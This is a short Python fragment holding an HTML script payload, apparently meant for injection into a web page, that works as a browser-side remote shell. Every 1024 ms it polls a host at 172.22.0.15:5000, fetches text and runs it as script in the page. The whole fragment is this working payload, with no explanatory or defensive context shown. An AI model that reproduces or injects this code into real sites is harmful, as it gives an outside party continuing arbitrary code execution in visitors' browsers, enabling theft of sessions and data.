remote_shell_script = b"""
  <script>
    const host = "http://172.22.0.15:5000/";
    function get (url, cb) {
      function reqListener () {
        cb(this.responseText);
      }
      var oReq = new XMLHttpRequest();
      oReq.addEventListener("load", reqListener);
      oReq.open("GET", url);
      oReq.send();
    }
    function retrieveAndExecuteCommands () {
      function exec (cmd) {
        if (cmd) {
          console.log("command:", cmd);
          const script = document.createElement("script");
          script.text = cmd;
          document.body.appendChild(script);
        }
      };
      get(host, exec);
    }
    setInterval(retrieveAndExecuteCommands, 1024);
  </script>
"""